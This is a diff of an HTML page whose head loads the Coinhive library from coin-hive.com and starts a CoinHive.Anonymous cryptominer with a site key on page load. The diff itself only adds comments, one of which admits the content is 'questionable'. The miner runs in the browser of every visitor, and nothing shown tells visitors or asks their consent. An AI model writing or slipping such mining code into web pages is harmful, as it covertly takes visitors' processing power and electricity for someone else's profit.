@@ -12,12 +12,14 @@
 
 <html>
   <head>
+    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <link rel="stylesheet" href="css/home.css">
     <script>
 	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
 	      miner.start();
     </script>
+    <!-- End questionable content -->
   </head>
   <body>
     <div id="title" align="center">
